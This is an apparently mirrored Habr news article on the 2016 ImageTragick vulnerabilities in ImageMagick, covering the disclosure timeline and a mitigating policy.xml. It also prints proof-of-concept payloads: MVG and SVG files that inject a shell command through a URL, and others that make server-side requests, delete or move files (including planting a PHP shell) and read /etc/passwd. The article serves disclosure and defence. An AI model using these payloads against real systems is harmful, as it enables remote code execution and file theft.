<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Multiple vulnerabilities in ImageMagick, one of which leads to RCE</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A few hours ago, Ryan Huber from Slack Security announced some critical vulnerability in software used by many sites. This software was ImageMagick - ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Multiple vulnerabilities in ImageMagick, one of which leads to RCE</h1><div class="post__text post__text-html js-mediator-article"><p>  A few hours ago, Ryan Huber from Slack Security <a href="https://twitter.com/ryanhuber/status/727525109481660416">announced some critical vulnerability</a> in software used by many sites.  This software was ImageMagick - a popular package for image processing. </p><br><p>  Summary of vulnerabilities is available on <a href="https://imagetragick.com/">imagetragick.com</a> .  Yes, without the name and the site for the vulnerability was not done this time, although initially Ryan wrote that there would be no pathos, including the name and the site.  (there is also <a href="https://twitter.com/ImageTragick">twitter</a> ) </p><br><p><img src="https://habrastorage.org/files/3c2/6e0/c1a/3c26e0c1a1cc4086928d9ee40beed3a0.png" alt="image"></p><br><p>  The vulnerability was detected by <a href="https://hackerone.com/stewie">stewie</a> and revealed on a hackerone on April 21 in a report, apparently, Mail.ru, because approximately a week after that Nikolay Ermishkin from the security team of Mail found an opportunity to perform RCE.  All of this, of course, told the IM development team.  Those on April 30 released a fix, but already on May 1 they were informed that the fix is ‚Äã‚Äãnot a bit fixed.  Therefore, on May 2, the vulnerability was disclosed in the mailing list of developers of packages based on IM, and on May 3, the vulnerability was disclosed publicly.  A few hours later, a detailed description appeared on the <a href="http://www.openwall.com/lists/oss-security/2016/05/03/18">openwall</a> with examples of exploits.  But more about that below. </p><a name="habracut"></a><br><p>  First of all, it's worth noting that your site is (probably) affected by these vulnerabilities not only if you use IM directly, but also through various packages, including imagick in PHP, rmagick and paperclip in Ruby and imagemagick in nodejs. </p><br><h3>  How to protect yourself? </h3><br><p>  In order to at least somehow defend oneself, it is proposed to do at least one of the following two things (and better both). </p><br><ul><li>  Before sending an image for processing in IM, check its ‚Äú <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">magic bytes</a> ‚Äù - a sequence of bytes by which programs determine the file format.  Yes, the extension may not play any role, since IM itself determines the format for precisely this sequence. </li><li>  enable <a href="https://www.imagemagick.org/script/resources.php">config</a> , disables vulnerable vulnerabilities decoders.  The file should look like this ( <strong>updated version of May 5</strong> ) </li></ul><br><pre><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policymap</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"coder"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rights</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"none"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">pattern</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"EPHEMERAL"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"coder"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rights</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"none"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">pattern</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"URL"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"coder"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rights</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"none"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">pattern</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"HTTPS"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"coder"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rights</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"none"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">pattern</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MVG"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"coder"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rights</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"none"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">pattern</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"MSL"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"coder"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rights</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"none"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">pattern</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TEXT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"coder"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rights</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"none"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">pattern</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SHOW"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"coder"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rights</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"none"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">pattern</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"WIN"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policy</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"coder"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">rights</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"none"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">pattern</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"PLT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">policymap</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  IM configs are usually located in <code>/etc/ImageMagick</code> .  <a href="https://habrahabr.ru/users/alexkbs/" class="user_link">alexkbs</a> in the <a href="https://habrahabr.ru/post/282896/">comments suggests</a> that you can use <code>convert -list policy</code> to find out where the config file is and see the list of effective restrictions.  To ansible sawed a <a href="https://paste.debian.net/680164/">playbook that adds this config</a> . </p><br><p>  As mentioned above, the IM patch is ready, but it is incomplete.  The fact is that, as the researchers note, the vulnerability was found earlier by hackers and is already being exploited. </p><br><h3>  Vulnerability Details and Operation </h3><br><p>  From the <a href="http://www.openwall.com/lists/oss-security/2016/05/03/18">post of Karim Valiev</a> (Mail) on the openwall. <del>  All PoC promise to place on <a href="https://github.com/ImageTragick/PoCs">https://github.com/ImageTragick/PoCs</a> (404 so far) </del>  .  <strong>UPD</strong> : put everything on <a href="https://github.com/ImageTragick/PoCs">https://github.com/ImageTragick/PoCs</a> + a simple script to check locally. </p><br><h4>  <strong>CVE-2016-3714 Insufficient character shielding leading to possible RCE</strong> </h4><br><p>  The problem is, IM has a <code>delegate</code> feature, which allows IM to process files with external libraries.  In essence, this is a <code>system()</code> call with a command line from the delegates.xml file.  One of the default commands </p><br><p> <code>"wget" -q -O "%o" "https:%M"</code> </p> <br><p>  where% M is the link from the input stream.  For example, you can proxy <code>https://example.com"|ls "-la</code> , which will lead to the execution of <code>ls -la</code> (must be installed wget or curl). </p><br><pre> <code class="hljs vhdl">$ convert <span class="hljs-symbol"><span class="hljs-symbol">'https</span></span>://example.com<span class="hljs-string"><span class="hljs-string">"|ls "</span></span>-la' <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>.png total <span class="hljs-number"><span class="hljs-number">32</span></span> drwxr-xr-x <span class="hljs-number"><span class="hljs-number">6</span></span> user <span class="hljs-keyword"><span class="hljs-keyword">group</span></span> <span class="hljs-number"><span class="hljs-number">204</span></span> Apr <span class="hljs-number"><span class="hljs-number">29</span></span> <span class="hljs-number"><span class="hljs-number">23</span></span>:<span class="hljs-number"><span class="hljs-number">08</span></span> . drwxr-xr-x+ <span class="hljs-number"><span class="hljs-number">232</span></span> user <span class="hljs-keyword"><span class="hljs-keyword">group</span></span> <span class="hljs-number"><span class="hljs-number">7888</span></span> Apr <span class="hljs-number"><span class="hljs-number">30</span></span> <span class="hljs-number"><span class="hljs-number">10</span></span>:<span class="hljs-number"><span class="hljs-number">37</span></span> .. ...</code> </pre> <br><p>  Worst of all, IM supports type formats. <br>  svg, mvg, which allow you to include external files via any protocols supported by the delegates. </p><br><p>  (exploit.mvg) </p><br><pre> <code class="hljs vhdl">push graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span> viewbox <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">640</span></span> <span class="hljs-number"><span class="hljs-number">480</span></span> fill <span class="hljs-symbol"><span class="hljs-symbol">'url</span></span>(https://example.com/image.jpg<span class="hljs-string"><span class="hljs-string">"|ls "</span></span>-la)' pop graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span></code> </pre> <br><p>  (exploit.svg) </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"640px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"480px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">version</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"1.1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2000/svg"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xlink</span></span></span><span class="hljs-tag">= </span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/1999/xlink"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">image</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xlink:href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://example.com/image.jpg&amp;quot;|ls &amp;quot;-la"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">x</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">y</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"640px"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"480px"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><pre> <code class="hljs cs">$ convert exploit.mvg <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>.png total <span class="hljs-number"><span class="hljs-number">32</span></span> drwxr-xr-x <span class="hljs-number"><span class="hljs-number">6</span></span> user <span class="hljs-keyword"><span class="hljs-keyword">group</span></span> <span class="hljs-number"><span class="hljs-number">204</span></span> Apr <span class="hljs-number"><span class="hljs-number">29</span></span> <span class="hljs-number"><span class="hljs-number">23</span></span>:<span class="hljs-number"><span class="hljs-number">08</span></span> . drwxr-xr-x+ <span class="hljs-number"><span class="hljs-number">232</span></span> user <span class="hljs-keyword"><span class="hljs-keyword">group</span></span> <span class="hljs-number"><span class="hljs-number">7888</span></span> Apr <span class="hljs-number"><span class="hljs-number">30</span></span> <span class="hljs-number"><span class="hljs-number">10</span></span>:<span class="hljs-number"><span class="hljs-number">37</span></span> .. ...</code> </pre> <br><p>  This immediately reminded me of a <a href="https://habrahabr.ru/company/mailru/blog/274855/">recent vulnerability in ffmpeg</a> , found by <a href="https://habrahabr.ru/users/cdump/" class="user_link">cdump</a> from the same Mail, by the way. </p><br><h4>  <strong>CVE-2016-3718 SSRF.</strong>  <strong>It is possible to perform HTTP GET and FTP requests</strong> </h4><br><p>  (ssrf.mvg) </p><br><pre> <code class="hljs perl"><span class="hljs-keyword"><span class="hljs-keyword">push</span></span> graphic-context viewbox <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">640</span></span> <span class="hljs-number"><span class="hljs-number">480</span></span> fill <span class="hljs-string"><span class="hljs-string">'url(http://example.com/)'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">pop</span></span> graphic-context</code> </pre> <br><pre> <code class="hljs objectivec">$ convert ssrf.mvg <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>.png <span class="hljs-meta"><span class="hljs-meta">#  HTTP   example.com</span></span></code> </pre> <br><h4>  <strong>CVE-2016-3715 Delete Files</strong> </h4><br><p>  Using the <code>ephemeral</code> pseudo-protocol, it is possible to delete files. </p><br><p>  (delete_file.mvg) </p><br><pre> <code class="hljs vhdl">push graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span> viewbox <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">640</span></span> <span class="hljs-number"><span class="hljs-number">480</span></span> image over <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-symbol"><span class="hljs-symbol">'ephemeral</span></span>:/tmp/delete.txt' popgraphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span></code> </pre> <br><pre> <code class="hljs pgsql">$ touch /tmp/<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span>.txt $ convert delete_file.mvg <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>.png #  /tmp/<span class="hljs-keyword"><span class="hljs-keyword">delete</span></span>.txt</code> </pre> <br><h4>  <strong>CVE-2016-3716 Moving Files</strong> </h4><br><p>  Another pseudo-protocol is used - <code>msl</code> . </p><br><p>  (file_move.mvg) </p><br><pre> <code class="hljs vhdl">push graphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span> viewbox <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">640</span></span> <span class="hljs-number"><span class="hljs-number">480</span></span> image over <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-symbol"><span class="hljs-symbol">'msl</span></span>:/tmp/msl.txt' popgraphic-<span class="hljs-keyword"><span class="hljs-keyword">context</span></span></code> </pre> <br><p>  (/tmp/msl.txt) </p><br><pre> <code class="hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">image</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">read</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">filename</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/tmp/image.gif"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">write</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">filename</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/var/www/shell.php"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">image</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  <code>/tmp/image.gif</code> - a picture with a PHP shell inside, for example, <a href="">https://www.secgeek.net/POC/POC.gif</a> . </p><br><pre> <code class="hljs objectivec">$ convert file_move.mvg <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>.png <span class="hljs-meta"><span class="hljs-meta">#  /tmp/image.gif  /var/www/shell.php</span></span></code> </pre> <br><h4>  <strong>CVE-2016-3717 Reading Local Files</strong> </h4><br><p>  Again the pseudo-protocol, this time <code>label</code> .  You can render the contents of files in pictures. </p><br><p>  (file_read.mvg) </p><br><pre> <code class="hljs perl"><span class="hljs-keyword"><span class="hljs-keyword">push</span></span> graphic-context viewbox <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">640</span></span> <span class="hljs-number"><span class="hljs-number">480</span></span> image over <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-string"><span class="hljs-string">'label:@/etc/passwd'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">pop</span></span> graphic-context</code> </pre> <br><pre> <code class="hljs objectivec">$ convert file_read.mvg <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>.png <span class="hljs-meta"><span class="hljs-meta">#      /etc/passwd</span></span></code> </pre> <br><h3>  Meta </h3><br><ul><li>  Dominique Bongard <a href="https://twitter.com/Reversity/status/727607525303066626">jokes</a> that he warned back in 2014.  This is one of the slides from his <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Bongard-Fingerprinting-Web-Application-Platforms-By-Variations-In-PNG-Implementations.pdf">report</a> from BlackHat 2014: </li></ul><br><p><img src="https://pbs.twimg.com/media/Chj7L8QWMAQ0bye.jpg:large" alt="image"></p><br><ul><li><p>  <a href="https://twitter.com/hdmoore/status/727588011077189636">HD Moore suggests</a> using MediaWiki engine to <a href="https://www.mediawiki.org/wiki/Manual:Installing_third-party_tools">switch generation of thumbnails</a> from IM to GD </p><br></li><li><p>  <a href="http://www.openwall.com/lists/oss-security/2016/05/04/1">Seth Arnold writes</a> that GraphicsMagick (fork IM, aimed at multithreading and performance), is likely to be subject to the same vulnerabilities.  Hopefully, the GM team will conduct an audit in the coming hours. <br>  <strong><a href="https://habrahabr.ru/post/282896/">UPD from</a> <a href="https://habrahabr.ru/users/kukutz/" class="user_link">kukutz</a> : the</strong> <a href="http://www.openwall.com/lists/oss-security/2016/05/04/3">author of GM asks to give him a working exploit</a> and advises to use the environment variable <code>MAGICK_CODER_STABILITY=PRIMARY</code> </p><br></li><li>  The ImageTragick authors <a href="https://twitter.com/ImageTragick/status/727645972969332738">responded with statistics</a> to the next claim to the name and logo for vulnerability: a regular blog post - hundreds of hits per hour, a site with a stupid logo - thousands of hits per minute.  When vulnerability is already exploited this way (branding), it seems, is quite justified. </li></ul><br><hr><br><p>  The post will be supplemented with new details. </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/282896/">https://habr.com/ru/post/282896/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../282876/index.html">The digest of interesting materials for the mobile developer # 151 (April 25-May 3)</a></li>
<li><a href="../282878/index.html">Validation: inside entities or outside?</a></li>
<li><a href="../282884/index.html">My experience setting up an environment for web development</a></li>
<li><a href="../282886/index.html">Attackers use a set of exploits for cyber attacks on Android users</a></li>
<li><a href="../282890/index.html">Sasha Goldshtein, the guru of .NET Performance, will speak at the .NET conference in St. Petersburg</a></li>
<li><a href="../282898/index.html">Upwork has monopoly greed</a></li>
<li><a href="../282900/index.html">Notes with MBC Symposium: more about saddle points</a></li>
<li><a href="../282902/index.html">Delphi. What does TDictionary</a></li>
<li><a href="../282906/index.html">Administrators of groups in vk have always been in the public domain.</a></li>
<li><a href="../282908/index.html">Virtual IT Infrastructure: Pros and Cons</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
